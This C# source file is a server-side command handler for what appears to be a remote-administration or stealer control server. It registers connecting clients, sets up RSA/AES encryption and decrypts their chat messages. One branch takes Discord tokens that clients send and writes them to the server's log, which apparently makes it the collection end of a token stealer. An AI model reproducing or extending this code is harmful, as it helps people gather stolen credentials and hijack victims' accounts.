

using Newtonsoft.Json;
using Server.CrossThreading;
using Server.Models;

namespace Server.CommandHandler
{
    public static class Handler
    {
        public static void CheckMessageForCommands(string message, Client client)
        {
            if (message.Contains("!WELCOMEMESSAGE!"))
            {
                string json = message.Replace("!WELCOMEMESSAGE!", "");
                ClientInfo clientInfo = JsonConvert.DeserializeObject<ClientInfo>(json);
                clientInfo.Id = Communication.Network.clientsList.Max(x => x.ClientInfo.Id) + 1;
                client.ClientInfo = clientInfo;
                string encryptedSymPassword = Communication.Encryption.FromAsymToSymEncryption.CreateEncryptedSynPassword(clientInfo, clientInfo.RSAPubKey);
                Communication.Network.Send(client.ClientInfo.Id, $"CLIENTINITIALIZE{encryptedSymPassword}!!!{clientInfo.Id}", false);
                UIAccesses.UpdateProtocolBox($"A client with the ID: {clientInfo.Id} connected.");
                UIAccesses.UpdateClientDataGridView(client.ClientInfo);
            }
            if (message.Contains("encryptedmessage"))
            {
                string[] dataFromMessage = message.Split("!");
                string flag = dataFromMessage[1];
                int id = Int32.Parse(dataFromMessage[2]);
                string encryptedMessage = dataFromMessage[3];

                //Bekommt den Client, der die Nachricht gesendet hat
                ClientInfo clientInfo = Communication.Network.clientsList.FirstOrDefault(x => x.ClientInfo.Id == id).ClientInfo;

                string plainMessage = Communication.Encryption.AES.Decrypt(Communication.Network.clientsList.FirstOrDefault(x => x.ClientInfo.Id == id).ClientInfo.SymKey, encryptedMessage);

                if (flag == "chatmessagefromclient")
                {
                    UIAccesses.UpdateChatBox($"Client {clientInfo.Id}: {plainMessage}");
                }
            }

            if (message.Contains("encryptionfailed"))
            {
                string clientId = message.Replace("encryptionfailed", "");

            }

            if (message.Contains("discordtoken"))
            {
                string token = message.Replace("discordtoken", "");
                UIAccesses.UpdateProtocolBox($"Client {client.ClientInfo.Id}: Discord Token: {token}");
            }
        }
    }
}
